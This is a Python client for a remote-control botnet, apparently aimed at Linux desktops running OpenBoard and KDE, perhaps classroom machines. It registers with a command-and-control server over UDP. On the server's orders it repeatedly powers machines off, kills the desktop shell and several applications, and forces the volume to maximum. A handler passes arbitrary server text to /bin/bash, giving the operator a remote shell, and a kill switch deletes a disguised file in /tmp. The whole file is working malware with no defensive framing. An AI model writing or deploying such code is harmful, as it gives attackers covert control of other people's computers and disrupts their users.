import socket, time, re, random, json
import sys, os
from threading import Thread, Lock
from subprocess import Popen, PIPE

dsthost = '127.0.0.1'
dstport = 12010
cfgwritelock = Lock()
sock = None
TMSI = None
PMSI = None

regex_matches_mode = "(?<=running in\s)(\w+)(?=\smode)"
regex_matches_required_action = "(?<=required\s).*"
regex_groups_imsi = "allocated\s+(\S+),"

def setup_socket(srcport):
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", srcport))

def udp_sendto_nowait(socket, host, port, message=''):
    socket.sendto(message.encode('utf-8'), (host, port))
        
def udp_sendto_action(socket, host, port, action=''):
    socket.sendto(action.encode('utf-8'), (host, port))
    if action == "initial":
        data, _ = socket.recvfrom(1024)
        data.decode('utf-8')
        stringdata = str(data)
        
        ssmode = re.findall(regex_matches_mode, stringdata)[0]
        ssreimsi = re.search(regex_groups_imsi, stringdata)
        ssimsi = ssreimsi.group(1)
        required_action = re.findall(regex_matches_required_action, stringdata)[0]

        TMSI = ssimsi

        if str(ssmode) == "prod":
            PMSI = ssimsi
            with cfgwritelock:
                with open("./data/cfg.txt", 'r+') as f:
                    jsondata = json.load(f)
                    jsondata['pmsi'] = str(PMSI)
                    f.seek(0)
                    f.truncate()
                    f.write(json.dumps(jsondata))
                    f.close()

        udp_sendto_nowait(socket, host, port, str(random.randint(100,999999999999)))
        print(f"Got allocation, c2 server is in {ssmode} mode, IMSI: {ssimsi}, required action: {required_action}")
    elif action == "reinitial":
        data, _ = socket.recvfrom(1024)
        data.decode('utf-8')
        stringdata = str(data)
        if "success" in stringdata:
            print("Realloc was successful! Client online")
        

def action_handling(action):
    print(f"Got action: {action}")
    actionpayload = action.split("|")
    if actionpayload[0] == "SHUTDOWN":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['poweroff'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))
    elif actionpayload[0] == "KILLPLASMASHELL":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['pkill', 'plasmashell'], stdout=PIPE, stderr=PIPE)
            time.sleep(5)
            process = Popen(['plasmashell'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))
    elif actionpayload[0] == "KILLOPENBOARD":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['pkill', 'OpenBoard'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))
    elif actionpayload[0] == "KILLSHIT":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['pkill', 'OpenBoard'], stdout=PIPE, stderr=PIPE)
            process = Popen(['pkill', 'vlc'], stdout=PIPE, stderr=PIPE)
            process = Popen(['pkill', 'dolphin'], stdout=PIPE, stderr=PIPE)
            process = Popen(['pkill', 'okular'], stdout=PIPE, stderr=PIPE)
            process = Popen(['pkill', 'chrome'], stdout=PIPE, stderr=PIPE)
            process = Popen(['pkill', 'chromium'], stdout=PIPE, stderr=PIPE)
            process = Popen(['pkill', 'chromuim-browser'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))
    elif actionpayload[0] == "VOLUPMAX":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['amixer', '-D', 'pulse', 'sset', 'Master', '100%+', 'unmute'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))
    elif actionpayload[0] == "VOLUPMIN":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['amixer', '-D', 'pulse', 'sset', 'Master', '100%-'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))
    elif actionpayload[0] == "KILLSWITCH":
        os.remove("/tmp/aautosave.py")
        sys.exit()

def action_shell_execute_handler(action):
    os.system(f"/bin/bash -c '{action}'")

def socket_listening(socket):
    global dsthost
    global dstport
    while True:
        data = socket.recv(1024)
        print("Received data from server:", data.decode('utf-8'))
        if data.decode('utf-8')[:6] == "ACTION":
            action_handling_thread = Thread(target=action_handling, args=(data.decode('utf-8')[6:],))
            action_handling_thread.start()
        elif data.decode('utf-8')[:11] == "SHELLACTION":
            action_shell_execute_handler_thread = Thread(target=action_shell_execute_handler, args=(data.decode('utf-8')[11:],))
            action_shell_execute_handler_thread.start()

        socket.sendto(bytes(f'keepalivedconn', encoding='utf-8'), (dsthost, dstport))
    
if __name__ == "__main__":
    setup_socket(57758)

    with open("./data/cfg.txt", 'r') as f:
        jsondata = json.load(f)
        if str(jsondata['pmsi']) != "0":
            TMSI = str(jsondata['pmsi'])
            PMSI = str(jsondata['pmsi'])

    if PMSI == None:
        udp_sendto_action(sock, dsthost, dstport, action="initial")
    else:
        udp_sendto_action(sock, dsthost, dstport, action=f"reinitial {PMSI}")
    socket_listeting_thread = Thread(target=socket_listening, args=(sock,))
    socket_listeting_thread.start()